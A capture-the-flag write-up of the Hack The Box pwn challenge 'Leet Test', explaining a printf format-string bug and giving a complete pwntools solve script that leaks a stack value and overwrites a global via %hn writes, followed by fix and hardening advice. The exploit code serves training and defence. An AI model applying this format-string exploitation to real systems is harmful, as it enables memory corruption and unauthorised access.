## Overview

**Leet Test** is an HTB Pwn challenge (Easy) built around a classic [use of externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html) bug: `printf(name_buf)` with no format specifier. The binary reads a random 16-bit value once on startup, then loops asking for a name and checking whether that value multiplied by a constant equals a hardcoded global. Two rounds of format-string exploitation — one to leak the random value, one to overwrite the global — deliver the flag.

**CWE:** [CWE-134](https://cwe.mitre.org/data/definitions/134.html) – Use of Externally-Controlled Format String

## The technique

The binary (`leet_test`, x86-64 ELF) has no PIE (fixed addresses), no stack canary, and a 30-second alarm. On entry it reads 2 bytes from `/dev/urandom` into `rand_val` (uint16, 0–65535), then enters a loop:

1. Print `Please enter your name: `
2. `fgets(name_buf, 256, stdin)`
3. **`printf(name_buf)`** ← the vulnerability
4. Check: `rand_val * 0x1337c0de == winner` (global at `0x404078`, initialized to `0xCAFEBABE`)
5. If equal → open `flag.txt`, print it, `exit()`
6. Else → print "Sorry!" and jump back to step 1

The loop never re-reads `/dev/urandom`, so `rand_val` is fixed for the whole TCP session. The goal is to write `rand_val * 0x1337c0de` into the `winner` global using the format string, so the check passes.

Key binary properties found via `checksec`:
- **Partial RELRO** (GOT is writable)
- **No canary**
- **NX enabled**
- **No PIE** — all addresses fixed at load time

## Solution

### Step 1 — Find the format string offset

The format string (our input) starts at printf argument offset 10. Confirm by sending `%10$p` and observing our own bytes echoed back. Stack slot 7 holds the leaked `rand_val` in its upper 32 bits (a 16-bit value zero-extended to 32 bits sits 4 bytes above an 8-byte-aligned boundary, so `(slot7 >> 32) & 0xFFFF` extracts it).

### Step 2 — Two-round exploit

**Round 1 — leak `rand_val`:**

```python
leak_fmt = b'START|' + b'|'.join(f'%{i}$016lx'.encode() for i in range(6, 13)) + b'|END'
p.sendline(leak_fmt)
out = p.recvuntil(b'Please enter your name: ', timeout=10)
raw = out.split(b'Hello, ')[1].split(b'\nSorry')[0]
vals = [int(t, 16) for t in raw.split(b'|') if t and t not in (b'START', b'END')]
rand_val = (vals[1] >> 32) & 0xFFFF   # slot 7, upper half
target   = (rand_val * 0x1337c0de) & 0xFFFFFFFF
```

**Round 2 — write `target` into `winner` and catch the flag:**

```python
from pwn import *
context.arch = 'amd64'   # mandatory — see gotcha below

payload = fmtstr_payload(10, {0x404078: target}, write_size='short')
p.sendline(payload)
out2 = p.recvuntil(b'}', timeout=15)   # NOT recvuntil(b'name:')
flag = out2[out2.index(b'HTB{'):]
```

### Full solve.py

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

HOST = '<target-ip>'
PORT = <target-port>
WINNER_ADDR = 0x404078
MULT = 0x1337c0de
FS_OFFSET = 10

def exploit():
    p = remote(HOST, PORT)
    p.recvuntil(b'Please enter your name: ')

    leak_fmt = b'START|' + b'|'.join(f'%{i}$016lx'.encode() for i in range(6, 13)) + b'|END'
    p.sendline(leak_fmt)
    out = p.recvuntil(b'Please enter your name: ', timeout=10)

    raw = out.split(b'Hello, ')[1].split(b'\nSorry')[0]
    vals = [int(t, 16) for t in raw.split(b'|') if t and t not in (b'START', b'END')]

    rand_val = (vals[1] >> 32) & 0xFFFF
    target   = (rand_val * MULT) & 0xFFFFFFFF

    payload = fmtstr_payload(FS_OFFSET, {WINNER_ADDR: target}, write_size='short')
    p.sendline(payload)

    try:
        out2 = p.recvuntil(b'}', timeout=15)
    except EOFError:
        out2 = p.buffer.get(0x10000)

    if b'HTB{' in out2:
        flag = out2[out2.index(b'HTB{'):].split(b'}')[0] + b'}'
        p.close()
        return flag.decode()

    p.close()

if __name__ == '__main__':
    print(exploit())
```

Flag: `HTB{...}`

## Why it worked

`printf(name_buf)` passes attacker-controlled data directly as the format string. With no PIE, the `winner` global sits at a known fixed address (`0x404078`). pwntools' `fmtstr_payload` generates a sequence of `%hn` writes that set the 32-bit global to any chosen value. The format string offset (10) tells pwntools where our buffer appears in the printf argument list so it can embed the target address inside the payload correctly.

The critical timing detail: the `winner` overwrite and the equality check both happen *inside the same `printf` call*. printf processes the write specifiers first, updating `winner` to `target`; then control returns to main and the check fires — `rand_val * 0x1337c0de == target` — so the binary opens `flag.txt` and exits immediately without looping back. Waiting for the next prompt with `recvuntil(b'name:')` therefore causes an EOFError; the flag must be caught with `recvuntil(b'}')` in round 2.

## Fix / defense

Replace:
```c
printf(name_buf);          // user controls the format string
```
with:
```c
printf("%s", name_buf);    // literal format string — %n is never interpreted
```

Additional hardening: compile with `-Wformat-security` (warns on `printf(var)` at build time) and `-D_FORTIFY_SOURCE=2` (aborts on detected format string misuse at runtime). Enable PIE (`-fpie -pie`) to defeat fixed-address writes even if the format string bug remains. Static analysis tools such as CodeQL and semgrep reliably flag bare `printf(var)` patterns before they ship.
